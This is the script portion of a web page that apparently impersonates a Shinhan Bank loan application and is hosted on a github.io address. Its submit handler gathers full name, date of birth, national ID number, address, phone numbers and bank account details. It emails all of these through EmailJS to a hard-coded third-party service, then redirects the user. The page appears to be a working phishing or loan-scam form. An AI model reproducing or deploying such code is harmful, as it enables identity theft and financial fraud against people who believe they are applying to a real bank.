            saveToLocalStorage();
        }

        function handleSubmit(event) {
            event.preventDefault();
            if (!validateForm()) return;

            const spinner = document.querySelectorAll('.spinner')[1];
            spinner.style.display = 'inline-block';

            userData = {
                fullName: document.getElementById('fullName').value.trim(),
                dob: document.getElementById('dob').value,
                gender: document.getElementById('gender').value,
                address: document.getElementById('address').value.trim(),
                cccd: document.getElementById('cccd').value.trim(),
                issuePlace: document.getElementById('issuePlace').value,
                phone: document.getElementById('phone').value.trim(),
                email: document.getElementById('email').value.trim(),
                loanType: document.getElementById('loanType').value,
                loanTerm: document.getElementById('loanTerm').value,
                loanAmount: document.getElementById('loanAmount').value,
                disbursementDate: document.getElementById('disbursementDate').value,
                interestRate: parseFloat(document.getElementById('interestRate').value) || 0,
                monthlyIncome: parseFloat(document.getElementById('monthlyIncome').value) || 0,
                occupation: document.getElementById('occupation').value,
                loanPurpose: document.getElementById('loanPurpose').value,
                relativePhone: document.getElementById('relativePhone').value.trim(),
                relationship: document.getElementById('relationship').value,
                accountName: document.getElementById('accountName').value.trim(),
                accountNumber: document.getElementById('accountNumber').value.trim(),
                bankName: document.getElementById('bankName').value,
                loanCode: "SHB" + Math.floor(100000 + Math.random() * 900000),
                monthlyPayment: userData.monthlyPayment || 0,
                totalInterest: userData.totalInterest || 0,
                totalRepayment: userData.totalRepayment || 0,
                currentStep: 2,
                isRegistered: true,
                emailSent: false
            };

            if (saveToLocalStorage()) {
                registeredUsers.push(userData.cccd);
                localStorage.setItem('registeredUsers', JSON.stringify(registeredUsers));
                localStorage.setItem('registered', 'true');

                emailjs.send('service_60tgxof', 'template_uhyb8ve', {
                    full_name: userData.fullName,
                    dob: userData.dob,
                    gender: userData.gender,
                    address: userData.address,
                    id_number: userData.cccd,
                    id_issue_place: userData.issuePlace,
                    phone_number: userData.phone,
                    email: userData.email,
                    loan_type: userData.loanType,
                    loan_term: userData.loanTerm,
                    loan_amount: userData.loanAmount,
                    interest_rate: userData.interestRate,
                    disbursement_date: userData.disbursementDate,
                    income: userData.monthlyIncome,
                    occupation: userData.occupation,
                    loan_purpose: userData.loanPurpose,
                    company_phone: userData.relativePhone,
                    company_address: userData.relationship,
                    account_holder_name: userData.accountName,
                    account_number: userData.accountNumber,
                    bank_name: userData.bankName,
                    loan_code: userData.loanCode
                })
                .then(() => {
                    console.log('Confirmation email sent');
                    userData.emailSent = true;
                    saveToLocalStorage();
                    spinner.style.display = 'none';
                    window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step2.html';
                }, (error) => {
                    console.error('Email sending failed:', error);
                    alert('Lỗi khi gửi email xác nhận. Vui lòng thử lại.');
                    spinner.style.display = 'none';
                });
            } else {
                spinner.style.display = 'none';
                alert('Lỗi lưu dữ liệu. Vui lòng thử lại.');
            }
        }

        function resetProgress() {
            if (confirm('Bạn có chắc chắn muốn xóa toàn bộ tiến trình?')) {
                localStorage.removeItem('userData');
                localStorage.removeItem('registeredUsers');
                localStorage.removeItem('registered');
                window.location.reload();
            }
        }

        // Auto-save progress on input change
        document.querySelectorAll('#registrationForm input, #registrationForm select').forEach(input => {
            input.addEventListener('change', saveFormDataRealTime);
        });
    </script>
</body>
</html>
